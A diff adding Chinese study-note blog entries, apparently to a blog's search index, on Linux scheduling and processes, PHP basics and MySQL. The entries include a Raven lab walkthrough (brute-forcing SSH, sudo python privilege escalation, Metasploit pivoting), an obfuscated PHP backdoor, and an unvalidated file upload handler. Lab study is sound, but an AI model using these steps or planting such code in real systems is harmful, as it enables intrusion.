+OK，成功解决，ip和域名访问不冲突，当然还有一些其他的解决方式，比如修改&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf文件
+]]></content>
+  </entry>
+  <entry>
+    <title>linux计划任务</title>
+    <url>/2025/08/06/linux%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
+    <content><![CDATA[一、计划任务简介在特定时间自动执行预先设定的命令和脚本
+比如：定期备份，服务器运维，数据更新
+二、Linux计划任务工具1.at适用场景：一次性&#x2F;延迟任务
+时间粒度：秒级
+特点：简单、轻量、无需持久化守护进程
+基本语法
+at 【选项】 时间表达式at支持灵活的时间表述now # 立即执行now + 5min # 5分钟后02:30 tomorrow/today # 次日2:302025-12-31 23:59 # 绝对时间#示例at now +5 minutes#ctrl+d用于提交任务#每个任务都有一个任务ID#查看所有待执行任务atq#删除任务atrm ID#查看任务内容at -C ID
+
+
+
+2.cron适用场景：周期性任务
+时间粒度：分钟级
+特点：复杂，需长期运行守护进程
+①cron核心功能
+cron用于执行周期性任务
+适用于以下场景：
+
+定时备份：每日&#x2F;每周自动备份数据。
+日志清理：定时删除过期日志文件。
+数据同步：每小时同步服务器间数据。
+监控报警：检测服务状态并发送通知。
+
+②配置文件
+cron有一个配置文件，是cron的编辑模板，路径为&#x2F;etc&#x2F;crontab
+[root@study ~]# cat /etc/crontabSHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root# For details see man 4 crontabs# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name  command to be executed#minute表示分钟#hour表示小时#day of month表示一个月当中第几天#munth表示第几个月#day of week表示一周的第几天示例：10 2 * 7 2 /etc/bin/systemctl restart httpd表示7月份中每周二凌晨2点10分执行重启apache服务
+
+③管理命令
+crontab -e：编辑任务
+打开当前用户的~&#x2F;.crontab文件，支持bim编辑器，用于添加、修改、删除个人定时任务
+crontab -l：列出任务
+显示当前用户的所有计划任务
+crontab -r：删除任务
+永久删除当前用户的所有计划任务
+crontab -u username：管理其他用户
+用于查看&#x2F;编辑其他用户的计划任务
+]]></content>
+  </entry>
+  <entry>
+    <title>linux进程管理</title>
+    <url>/2025/08/06/linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[一、进程简介1.进程是什么
+程序在启动时、命令在执行时或服务在运行时会产生进程，产生一个或多个，这些进程来完成程序、命令或服务，所以进程是正在执行的程序的实例。
+
+2.程序和进程
+程序： 是一组静态的指令代码，存储在磁盘上的文件中。它本身是“死的”，不占用系统资源（除了存储空间）。
+进程： 是程序被加载到内存中开始运行后的动态实体。它是“活的”，需要操作系统为其分配和管理各种资源才能执行。
+
+3.进程的状态进程在其生命周期中会处于不同的状态：
+
+新建（new）： 进程正在被创建。
+就绪（Runable）： 进程已获得除CPU之外的所有必要资源，等待被操作系统调度执行。
+运行（Running）： 进程正在CPU上执行其指令。
+阻塞&#x2F;等待（Stopped）： 进程因等待某个事件（如I&#x2F;O操作完成、信号量资源）而暂停执行。
+终止&#x2F;退出： 进程执行完毕或被强制终止，等待操作系统回收其资源。
+僵尸态（Zombie）：子进程先结束，但是父进程没有回收子进程。
+
+4.进程PID每个进程由唯一的一个非负整数来标识，从1开始分配，通过PID能精确定位到具体进程。
+PID的分配规则：
+
+取值范围
+PID从 1 开始分配（系统启动后的第一个进程是 init 或 systemd ，PID&#x3D;1）。
+最大PID值由内核参数 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max 定义（默认通常为 32768 ）。
+当PID达到最大值时，会循环使用已释放的PID（但不会重复分配给仍在运行的进程）。
+
+回收机制
+
+
+​       进程终止后，其PID会被释放，供后续新进程使用
+PID的特殊角色：
+
+PID&#x3D;1（systemd进程）
+系统启动后的第一个进程，负责启动和管理其他所有用户进程。
+如果PID&#x3D;1的进程终止，系统会触发内核恐慌（Kernel Panic）并崩溃。
+
+父进程PID（PPID）
+每个进程（除Init）都有父进程（Parent Process），父进程的PID称为 PPID。
+
+
+5.进程字段解析
+PID：进程 ID
+PPID：父进程 ID
+USER：进程所有者
+%CPU：CPU 占用率
+%MEM：内存占用率
+VSZ：虚拟内存大小（KB）
+RSS：物理内存大小（KB）
+TTY：关联的终端
+STAT：进程状态（如 S &#x3D;睡眠， R &#x3D;运行）
+START：进程启动时间
+TIME：累计 CPU 时间
+COMMAND：启动命令（ [] 表示内核线程）
+
+二、进程管理进程管理可以通过ps、top、kill来进行管理。
+1.psps是linux中查看当前系统进程状态的工具，用于静态查看进程，显示进程的详细信息，如：PID、CPU、运行时间、进程状态等等。
+①基本语法：
+ps 【选项】#常用参数#显示所有进程（包括其他用户进程）-e或-A #显示所有终端进程（除会话领导者）-a#显示不关联终端的进程（如守护进程）-x#显示指定用户的进程（如-u root）-u#显示指定字段-o
+
+②常用搭配：
+#显示所有进程详细信息，BSD风格ps aux#显示所有进程完整信息，Unix风格ps -ef#显示pid、用户、cpu占用、内存占用，按照cpu降序ps -eo pid,user,%cpu,%mem,cmd --sort=-%cpu | head#搭配grep来指定要显示内容#显示httpd进程ps aux | grep httpd
+
+2.toptop是linux中最常用的实时系统监控工具，用于动态显示进程资源占用和系统整体状态，提供交互式操作，用户能够快速分析性能瓶颈
+①基础语法
+#启动toptop#退出topq或Ctrl+C
+
+②界面解析
+top 界面分为 摘要区（系统概览）和 进程列表区（实时进程信息）
+上半部分（系统概览）下半部分（进程列表）
+
+③交互式命令
+
+k：终止进程（输入 PID，再输入信号，默认 SIGTERM ）。
+r：调整进程优先级（输入 PID，再输入 Nice 值）。
+P：按 CPU 使用率排序。
+M：按内存使用率排序。
+T：按运行时间排序。
+N：按 PID 排序。
+z：切换颜色高亮显示。
+c：显示完整命令路径。
+1：展开显示每个 CPU 核心的负载。
+h：查看帮助信息。
+空格：立即刷新界面。
+
+3.killkill命令可以用于刷新或者杀死进程
+①信号控制
+kill命令可以加上不同信号来完成对进程的不同操作
+#查看所有信号kill -l[root@study 桌面]# kill -l 1) SIGHUP	 2) SIGINT	 3) SIGQUIT	 4) SIGILL	 5) SIGTRAP 6) SIGABRT	 7) SIGBUS	 8) SIGFPE	 9) SIGKILL	10) SIGUSR111) SIGSEGV	12) SIGUSR2	13) SIGPIPE	14) SIGALRM	15) SIGTERM16) SIGSTKFLT	17) SIGCHLD	18) SIGCONT	19) SIGSTOP	20) SIGTSTP21) SIGTTIN	22) SIGTTOU	23) SIGURG	24) SIGXCPU	25) SIGXFSZ26) SIGVTALRM	27) SIGPROF	28) SIGWINCH	29) SIGIO	30) SIGPWR31) SIGSYS	34) SIGRTMIN	35) SIGRTMIN+1	36) SIGRTMIN+2	37) SIGRTMIN+338) SIGRTMIN+4	39) SIGRTMIN+5	40) SIGRTMIN+6	41) SIGRTMIN+7	42) SIGRTMIN+843) SIGRTMIN+9	44) SIGRTMIN+10	45) SIGRTMIN+11	46) SIGRTMIN+12	47) SIGRTMIN+1348) SIGRTMIN+14	49) SIGRTMIN+15	50) SIGRTMAX-14	51) SIGRTMAX-13	52) SIGRTMAX-1253) SIGRTMAX-11	54) SIGRTMAX-10	55) SIGRTMAX-9	56) SIGRTMAX-8	57) SIGRTMAX-758) SIGRTMAX-6	59) SIGRTMAX-5	60) SIGRTMAX-4	61) SIGRTMAX-3	62) SIGRTMAX-263) SIGRTMAX-1	64) SIGRTMAX	
+
+总共64种信号
+②常用信号
+
+1：SIGHUP (重载配置)&#x2F;重刷新一个进程，主要用户服务的刷新
+9：SIGKILL (强制终止)&#x2F;杀掉一个进程，但不杀掉其子进程（centos7）
+15：SIGTERM (正常终止)&#x2F;杀掉进程及其子进程
+18：SIGCONT (恢复执行)
+19：SIGSTOP (暂停)&#x2F;暂停一个进程
+
+用法
+#杀死进程PID位1234的进程kill -9 1234
+
+PID为1的进程为系统进程，别使用kill进行杀死
+三、作业控制linux可以在一个终端中管理多个任务进程(这些进程称之为job)。有些进程会占用终端运行很久或是一直占用终端，那么想要运行第二进程就无法操作了，所以进程可以放到后台执行，这样就不影响在同一个终端运行第二个进程了
+前后台管理#使用sleep命令开启占用终端sleep 10000&amp;#‘&amp;’表示将sleep挂到后台运行，这样救不占用终端#查看后台运行作业jobs -l[root@study 桌面]# jobs -l[1]+  6659 运行中               sleep 10000 &amp;#作业调度#将后台任务调度到前台fg %1 #将后台暂停任务运行bg %1#%1表示作业号为1的作业#用kill杀死时必须加上%1#如果是kill 1表示杀死系统进程，谨慎操作
+
+]]></content>
+  </entry>
+  <entry>
+    <title>web练习2</title>
+    <url>/2025/08/12/web%E7%BB%83%E4%B9%A02/</url>
+    <content><![CDATA[1、if语句当成绩在60以上时为及格，60以下时为不及格
+①编写php代码
+&lt;?php$a = $_GET[&#x27;a&#x27;];    //接受get传参a，赋值给变量$aif($a &gt;= 60)&#123;       //判断语句，及格为PASS,不及格为FAIL	echo &quot;PASS&quot;;&#125;else&#123;	echo &quot;FAIL&quot;;&#125;?&gt;
+
+②在url中输入?a&#x3D;64，页面回显PASS
+
+③在url中输入?a&#x3D;55，页面回显FAIL
+
+2、switch语句实现在浏览器端传递参数，number&#x3D;1能够显示为一月，以及后续的月份
+①编写php代码
+&lt;?php$a = $_GET[&#x27;a&#x27;];   //接收get传参switch($a)&#123;        //根据收到参数输出月份	case 1:	echo &quot;Jan&quot;;	break;	case 2:	echo &quot;Feb&quot;;	break;	case 3:	echo &quot;Mar&quot;;	break;	case 4:	echo &quot;Apr&quot;;	break;	case 5:	echo &quot;May&quot;;	break;	case 6:	echo &quot;Jun&quot;;	break;	case 7:	echo &quot;Jul&quot;;	break;	case 8:	echo &quot;Aug&quot;;	break;	case 9:	echo &quot;Sep&quot;;	break;	case 10:	echo &quot;Oct&quot;;	break;	case 11:	echo &quot;Nov&quot;;	break;	case 12:	echo &quot;Dec&quot;;	break;	default:	echo &quot;Plase intput a value&quot;;     //无参数输入则输出请输入一个值&#125;?&gt;
+
+②在页面随便输入几个月份来验证，如2，4，6
+
+
+③如果没有输入参数的话，验证回显
+
+3、for循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字
+①编写php代码
+&lt;?phpfor($i=1;$i&lt;=100;$i++)&#123;     //for循环输出1-100	if($i % 17 == 0)&#123;       //如果是17的整数倍则跳过，使用continue跳过		echo &quot;  &quot;;          //输出空格方便观看		continue;	&#125;	echo $i;&#125;?&gt;
+
+②上网页验证
+
+4、Raven靶场测试环境
+
+
+
+主机
+网卡
+地址
+
+
+
+kali（攻击机）
+nat
+192.168.18.132
+
+
+raven（服务器&#x2F;内网）
+nat&#x2F;vmnet0
+192.168.18.167&#x2F;
+
+
+win7（内网主机）
+vmnet0
+
+
+
+①kali端先扫描本网段下存活的主机
+nmap -sn 192.168.18.0/24  #扫描存活主机
+
+
+这里我们找到一个192.168.18.167的存活主机，并且有raven标识，推测应该是目标机器，我们去访问一下
+
+发现是一个web网站
+再扫描该主机开放端口及服务
+nmap -A 192.168.18.167
+
+
+发现开启了关键的一个ssh服务，方便后续利用
+②尝试去爆破一下后台目录
+dirb http://192.168.18.167    #爆破后台，kali自带工具
+
+
+发现一个疑似后台目录，并且使用的是wordpress开源内容管理系统框架
+③访问后台
+
+成功访问到后台
+④尝试爆破后台目录
+kali自带wpscan工具，专为wordpress设计，可以用来枚举用户
+wpscan --url http://192.168.18.167/wordpress --wp-content-dir -at -eu
+
+
+此时我们发现了一个steven用户和michael用户
+此时枚举出用户之后我们就可以尝试去爆破密码，登录后台
+⑤爆破ssh服务
+既然有了账户，我们推测，服务器管理员会不会让系统账户和网站账户使用相同用户名呢
+测试一下去爆破ssh
+#hydra九头蛇是一个强大的爆破工具hydra -l michael -P 1.txt ssh://192.168.18.167hydra -l steven -P 1.txt ssh://192.168.18.167-l指定用户名-L指定用户名字典-p指定密码-P指定密码字典我们在当前目前下创建一个密码字典1.txt
+
+
+
+我们爆破出来michael账户密码michael，steven账户密码pink84
+⑥ssh连接进行登录
+使用michael账户登录
+ssh michael@192.168.18.167
+
+
+我们成功远程连接到目标主机，接下来就可以开始找我们想要的东西
+查看网站根目录
+cd /var/wwwls
+
+
+我们发现一个flag文件，我们打开看看
+cat flag2.txt
+
+
+发现一串字符，如果这是ctf，恭喜你，可以拿去通关了
+我们进入到html这个网站目录
+cd /htmlls
+
+
+发现一个这个网站wordpress根目录，里面肯定有重要信息，进去看看
+cd wordpressls
+
+
+发现一个配置文件，wp-config.php，这个文件通常保存数据库等重要信息，我们打开看看
+cat wp-config.php
+
+
+我们发现数据库Mysql的账户密码，看样子还是管理员账户，接下来去登录数据库
+mysql -uroot -pR@v3nSecurity
+
+
+成功登录数据库，接下来就可以去查看数据库里的账户密码了
+show databases;use wordpress;show tables;select * from wp_users;
+
+
+
+
+我们发现了账户和密码，但是密码是加密过的，一时间不能解密，怎么办呢？？？？
+我们登录的是root用户，当然可以修改密码，我们修改michael的密码，然后去后台登录试试
+update wp_users set user_pass=md5(&#x27;Admin123&#x27;) where id=1;
+
+
+成功登录后台！！！！
+⑦ssh登录另一个账户，密码pink84
+ssh steven@192.168.18.167
+
+
+成功登录
+⑧查看可用权限
+sudo -l    #查看当前用户可以使用sudo执行什么文件或者命令
+
+
+我们发现可以执行python命令，python是一个强大的解释器，可以用来执行系统命令，因此我们可以使用python进行提权
+sudo /usr/bin/python -c &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;
+
+
+我们成功提权到root用户，等于是拿下了这台机器
+⑨网络嗅探
+拿下一台主机后，可以去查看网络配置情况，是否有其他网卡可以连接内网
+ip a或ifconfig
+
+
+我们发现两个网卡，第二个网卡应该是通向内网，这里是靶场，所以我们应该去手动开启第二个网卡eth1
+echo &quot;auto eth1&quot; &gt;&gt; /etc/network/interfacesecho &quot;iface eth1 inet dhcp&quot; &gt;&gt; /etc/network/interfacesifconfig eth1 upsystemctl restart networkingip a
+
+
+我们查看到第二个网卡的ip，这个ip应该能访问内网
+⑩流量代理
+虽然看见了第二个网卡，但是拿下的服务器上没有攻击工具，并且kali不能访问到内网，所以我们需要做流量代理，将拿下的raven作为跳板
+#新开一个终端msfconsoleuse auxiliary/scanner/ssh/ssh_login     #msf的一个攻击模块set username michaelset password michaelset rhosts 192.168.18.167run
+
+
+获取sessions
+sessions -lsessions -u 1sessions -i 2
+
+
+设置自动路由，将目标机器作为跳板
+run post/multi/manage/autorouterun autoroute -pbackground
+
+
+可以看见我们的kali已经有了一个路由表
+我们需要再启动socks5服务
+use auxiliary/server/socks_proxyoptionsrun
+
+
+配置流量客户端工具，启动代理
+vim /etc/proxychains4.confsocks5 127.0.0.1 1080
+
+
+本来应该是通过nmap继续扫描159网段的存活主机，但是为了避免繁琐操作，直接去远程桌面连接win7，账户是administator，密码123456
+proxychains rdesktop -u administrator -p 123456 192.168.159.130
+
+
+成功连接
+扩展1、else if语句90-100为优秀，80-89良好，60-79及格,60以下不及格，如果数字不在0-100范围之内如何解决
+①编写代码
+&lt;?php$a = @$_GET[&#x27;a&#x27;];                    //接收传参   if($a&gt;=90 &amp;&amp; $a&lt;=100)&#123;               //分数在90-100，不能以数学的形式来写，如1&lt;a&lt;5    echo &quot;best&quot;;&#125;else if($a&gt;=80 &amp;&amp; $a&lt;90)&#123;           //分数在80-89	echo &quot;better&quot;;&#125;else if($a&gt;=60 &amp;&amp; $a&lt;80)&#123;           //分数在60-79	echo &quot;pass&quot;;&#125;else if($a &lt; 60)&#123;                   //分数小于60	echo &quot;fail&quot;;&#125;else&#123;	echo &quot;plase int the score in 0-100&quot;;    //当输入不合法时&#125;?&gt;
+
+②在前端网页验证，输入95，85，70，，50，110（不合法）
+
+
+
+
+
+]]></content>
+  </entry>
+  <entry>
+    <title>web练习1</title>
+    <url>/2025/08/11/web%E7%BB%83%E4%B9%A01/</url>
+    <content><![CDATA[一、h5简介HyperTextMarkupLanguage（超文本标记语言），超文本包括：文字、图片、音频、视频、动画等HTML5作为最新版本，提供了一些新的元素和一些有趣的新特性，同时也建立了一些新的规则。这些元素、特性和规则的建立，提供了许多新的网页功能，如使用网页实现动态渲染图形、图表、图像和动画，以及不需要安装任何插件直接使用网页播放视频等。
+1.HTML基本结构&lt;!DOCTYPE&gt;声明位于文档中的最前面的位置，处于&lt;html&gt;标签之前。&lt;!DOCTYPE&gt;声明不是一个HTML标签；它是用来告知Web浏览器页面使用了哪种HTML版本。&lt;meta&gt;设置网页的编码，SEO&lt;metacharset=&quot;UTF-8&quot;&gt;&lt;metaname=&quot;keywords&quot;content=&quot;是兄弟就来kan我&quot;&gt;
+
+2.网页的基本标签//标题标签//h1最大，h6最小&lt;h1&gt;X&lt;/h1&gt;&lt;h2&gt;X&lt;/h2&gt;&lt;h3&gt;X&lt;/h3&gt;&lt;h4&gt;X&lt;/h4&gt;&lt;h5&gt;X&lt;/h5&gt;&lt;h6&gt;X&lt;/h6&gt;//段落标签&lt;p&gt;yyds&lt;/p&gt;//换行标签&lt;br/&gt;//水平线标签&lt;hr/&gt;//特殊符号&lt;!DOCTYPEhtml&gt;&lt;htmllang=&quot;en&quot;&gt;&lt;head&gt;&lt;metacharset=&quot;UTF-8&quot;&gt;&lt;title&gt;特殊符号&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--空格--&gt;&lt;p&gt;yyds&lt;br/&gt;yyds&lt;br/&gt;yy&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ds&lt;br/&gt;&lt;/p&gt;&lt;!--大于小于--&gt;&lt;p&gt;&gt;&lt;&lt;br&gt;&amp;gt;&amp;lt;&lt;/p&gt;&lt;!--引号--&gt;&lt;p&gt;&amp;quot;YUYU&amp;quot;&lt;/p&gt;&lt;!--版权--&gt;&lt;p&gt;&amp;copy;YUYU&lt;/p&gt;&lt;!--&amp;符号+xxx--&gt;&lt;/body&gt;&lt;/html&gt;//图像标签//常见的图像格式：jpg、gif、png(受浏览器兼容性限制)&lt;imgsrc=&quot;图片的位置&quot;alt=&quot;图片异常替代文字&quot;title=&quot;鼠标悬停文字&quot;&gt;//链接标签//页面间链接：从一个页面链接到另外一个页面&lt;ahref=&quot;path&quot;target=&quot;_self&quot;&gt;文本或者图像&lt;/a&gt;&lt;ahref=&quot;path&quot;target=&quot;_blank&quot;&gt;文本或者图像&lt;/a&gt;//锚链接//ctrl+d复制当前行到下一行&lt;aname=&quot;top&quot;&gt;顶部&lt;/a&gt;&lt;aherf=&quot;#top&quot;&gt;跳转到顶部&lt;/a&gt;
+
+
+
+二、练习1、html页面&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;田珩瑀&lt;/title&gt; //网页标签&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;1.png&quot; alt=&quot;狮子图片&quot; title=&quot;这是狮子&quot;&gt;  //图片保存在了页面同级目录下	&lt;br \&gt;	&lt;br \&gt;    &lt;form method=&quot;GET&quot; action=&quot;1.php&quot;&gt;	&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;账户1&lt;br \&gt;	&lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;密码2&lt;br \&gt;	&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;	&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;
+
+这是网页实体效果
+
+这是编写的后端php代码，也是保存在网页同级目录下
+&lt;?php$name = $_GET[&#x27;name&#x27;];    //接受get传参数据$password = $_GET[&#x27;pass&#x27;];   //接受get传参数据echo $name;echo &quot;&lt;br \&gt;&quot;;echo $password;echo &quot;&lt;br \&gt;&quot;;?&gt;
+
+①使用GET传参
+代码同上，在表单处输入数据并提交
+
+
+成功在传到后端，在url显示数据，并输出到页面！！！！
+②POST传参
+修改html文件和php文件的代码，将方法改为POST
+#html&lt;form method=&quot;POST&quot; action=&quot;1.php&quot;&gt;#php$name = $_POST[&#x27;name&#x27;];$password = $_POST[&#x27;pass&#x27;];
+
+修改好之后，在表单处输入数据并提交
+
+
+成功显示，并且url不包含数据！！！！！
+2、php定义变量在刚才的php代码中加入如下代码
+$thy = &quot;tianhengyu&quot;; //定义了一个变量名为thy，数据为字符串tianhengyuecho $thy;   //输出数据
+
+添加好代码后保存，刷新页面
+
+成功打印！！！！！
+3、修改变量值为int类型$thy = 456789;    //改为int类型var_dump ($thy);   //显示数据类型
+
+
+但是如果是将原本的字符串修改为int类型的话
+echo (int)$thy
+
+输出为0
+
+4、可变变量编写php代码
+&lt;?php$cxk = &quot;god&quot;;  //给变量cxk赋值为god$god = &quot;i love cxk!&quot;;  //给变量god赋值为i love cxk！echo $$cxk;        //此时要输出时，首先$cxk会变成god，所以最后输出的其实是，$god?&gt;
+
+输出如下
+
+5、burp或者yakit抓包①打开burp，设置监听地址和端口
+
+②在浏览器设置代理地址和端口为burp设置的一样
+
+③浏览器访问页面，在访问的时候访问ip地址，不能使用localhost，不然抓不到包
+
+④burp开启拦截
+
+⑤在页面输入数据，并提交表单
+成功抓到get数据包
+
+我们来修改代码为post传参，同第一题一样
+#html&lt;form method=&quot;POST&quot; action=&quot;1.php&quot;&gt;#php$name = $_POST[&#x27;name&#x27;];$password = $_POST[&#x27;pass&#x27;];
+
+改完之后抓包
+
+成功抓到数据包
+⑥对比
+
+两者的请求方法不同
+
+post方法多了Content-Type、Content-Length、Origin字段
+
+get请求数据在url中，post数据在请求体里面
+
+
+扩展使用form表单上传文件存储到服务器①编写代码
+前端
+&lt;form method=&quot;POST&quot; action=&quot;1.php&quot; enctype=&quot;multipart/form-data&quot;&gt; //post方法上传文件到1.php中去处理	&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;br \&gt;	&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;	&lt;form&gt;
+
+效果如下
+
+后端
+$file = $_FILES[&quot;file&quot;];     //$_FILE全局变量接受从前端上传的文件$filename = $file[&quot;name&quot;];   //赋予文件名$filePath = $file[&#x27;tmp_name&#x27;];   //将文件保存在临时目录move_uploaded_file($filePath,&quot;uploadfile/&quot;.$filename);  //将文件移动到网站根目录下的uploadfile目录
+
+我们先创建一个文件在桌面
+
+我们在前端选择文件然后上传
+
+之后通过路径去访问一下刚才上传的文件
+/uploadfile/1.txt
+
+
+成功访问，证明上传成功！！！但是因为编码原因，符号乱码
+]]></content>
+  </entry>
+  <entry>
+    <title>web练习3</title>
+    <url>/2025/08/13/web%E7%BB%83%E4%B9%A03/</url>
+    <content><![CDATA[1、编写一个函数，要求可以根据前端传递的参数判断当前月份，要求传递的数字不符合1-12的规范时有报错提示①编写php代码
+&lt;?php@$a = $_GET[&quot;a&quot;];if($a&gt;=1 &amp;&amp; $a&lt;=12)&#123;	switch($a)&#123;		case 1:		echo &quot;January&quot;;		break;		case 2:		echo &quot;February&quot;;		break;		case 3:		echo &quot;March&quot;;		break;		case 4:		echo &quot;April&quot;;		break;		case 5:		echo &quot;May&quot;;		break;		case 6:		echo &quot;June&quot;;		break;		case 7:		echo &quot;July&quot;;		break;		case 8:		echo &quot;August&quot;;		break;		case 9:		echo &quot;September&quot;;		break;		case 10:		echo &quot;October&quot;;		break;		case 11:		echo &quot;November&quot;;		break;		case 12:		echo &quot;December&quot;;		break;	&#125;&#125;else&#123;	echo &quot;The input number is illegal&quot;;&#125;?&gt;
+
+②在网页验证
+在url栏输入?a&#x3D;8和?a&#x3D;19
+
+成功回显
+
+发生报错
+2、编写一个函数，要求前端传递参数6，函数执行1+2+3+4+5+6，输出最终结果①编写php代码
+&lt;?php@$a = $_GET[&quot;a&quot;];$i = 1;$b = 0;while($a&gt;0)&#123;	$b = $i + $b;	$i++;	$a--;&#125;echo $b;?&gt;
+
+②网页做验证
+
+成功回显
+3、动态函数编写一个简单的后门①编写php代码
+&lt;?php$A = &quot;G&quot;;  //定义$A，赋值为字符G$B = &quot;ET&quot;;  //定义$B，赋值为字符ET$C = &quot;_&quot;.$A.$B;  //定义$C，将字符拼接，赋值给$C，$C此时被赋值字符串为“_GET”$D = $$C;  //定义$D，通过可变变量将$D赋值为超全局变量$_GET@$E = $D[&quot;a&quot;];  //定义$E接收前端传参a@$F = $D[&quot;b&quot;];  //定义$F接收前端传参b@$E($F);  //通过变形，达到$_GET[&quot;a&quot;]($_GET[&quot;b&quot;]),一个简单后门写好了?&gt;
+
+②网页验证
+url输入?a&#x3D;system&amp;b&#x3D;ipconfig，后端达到system(ipconfig)的效果
+
+4、mysql数据库操作①cmd登录数据库，用户名root，密码root
+mysql -uroot -proot
+
+
+②查看当前有哪些数据库
+show databases;
+
+
+没有我们想要的库
+③创建数据库student
+create database student;
+
+
+成功创建数据库student
+④创建表user,以及字段id、name、tel，id设为主键
+use studentcreate table student.user(id int,name char(15),tel char(11),primary key(id));desc student.user
+
+
+成功创建user表以及各字段
+5、将信息写入字段，根据id查询①填入信息
+insert into student.user(id,name,tel) value (1,&#x27;tianhengyu&#x27;,13989898989);
+
+其他信息改变value执行
+
+成功创建
+②查询数据，根据id
+select * from student.user where id = 1;
+
+
+成功查询
+6、select语句查询
+select column_name,table_name,table_schema from information_schema.columns;
+
+
+成功查询到字段，所属的表和所属的库
+]]></content>
+  </entry>
+  <entry>
+    <title>web练习4</title>
+    <url>/2025/08/14/web%E7%BB%83%E4%B9%A04/</url>
+    <content><![CDATA[1、mysql数据库基操①创建数据库cms
+create database cms;
+
+
+已经创建好cms数据库
+②创建表user
+create table cms.user(id int auto_increment primary key,uname char(32),pass char(32));//设置主键为id，并且自增auto_increment primary key 
+
+
+创建了user表，并且具有id，uname，pass字段
+2、编写一个登录页面①编写代码
+&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;登录&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;        用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;        密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;        &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;    &lt;/form&gt;	&lt;form method=&quot;get&quot; action=&quot;register.php&quot;&gt;	&lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt;	&lt;/form&gt;&lt;/body&gt;
+
+②效果展示
+
+这个登录框有点丑陋
+③ai美化
+&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;登录&lt;/title&gt;    &lt;style&gt;        * &#123;            margin: 0;            padding: 0;            box-sizing: border-box;            font-family: &#x27;Arial&#x27;, sans-serif;        &#125;        body &#123;            background-color: #f5f7fa;            display: flex;            justify-content: center;            align-items: center;            min-height: 100vh;            padding: 20px;        &#125;        .container &#123;            background-color: white;            border-radius: 10px;            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);            padding: 40px;            width: 100%;            max-width: 400px;        &#125;        h2 &#123;            text-align: center;            margin-bottom: 30px;            color: #333;        &#125;        .form-group &#123;            margin-bottom: 20px;        &#125;        .form-group label &#123;            display: block;            margin-bottom: 8px;            color: #555;            font-weight: 500;        &#125;        .form-group input[type=&quot;text&quot;],        .form-group input[type=&quot;password&quot;] &#123;            width: 100%;            padding: 12px;            border: 1px solid #ddd;            border-radius: 6px;            font-size: 16px;            transition: border-color 0.3s;        &#125;        .form-group input[type=&quot;text&quot;]:focus,        .form-group input[type=&quot;password&quot;]:focus &#123;            border-color: #4a90e2;            outline: none;            box-shadow: 0 0 0 2px rgba(74, 144, 226, 0.2);        &#125;        .form-actions &#123;            display: flex;            flex-direction: column;            gap: 15px;            margin-top: 30px;        &#125;        .btn &#123;            padding: 12px;            border: none;            border-radius: 6px;            font-size: 16px;            font-weight: 600;            cursor: pointer;            transition: background-color 0.3s, transform 0.1s;        &#125;        .btn-primary &#123;            background-color: #4a90e2;            color: white;        &#125;        .btn-primary:hover &#123;            background-color: #3a7bc8;        &#125;        .btn-primary:active &#123;            transform: scale(0.98);        &#125;        .btn-secondary &#123;            background-color: #f0f0f0;            color: #555;        &#125;        .btn-secondary:hover &#123;            background-color: #e0e0e0;        &#125;        .btn-secondary:active &#123;            transform: scale(0.98);        &#125;        .error-message &#123;            color: #e74c3c;            text-align: center;            margin-top: 20px;            padding: 10px;            border-radius: 6px;            background-color: #fadbd8;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h2&gt;用户登录&lt;/h2&gt;        &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;            &lt;div class=&quot;form-group&quot;&gt;                &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;                &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;            &lt;/div&gt;            &lt;div class=&quot;form-group&quot;&gt;                &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;                &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;            &lt;/div&gt;            &lt;div class=&quot;form-actions&quot;&gt;                &lt;input type=&quot;submit&quot; class=&quot;btn 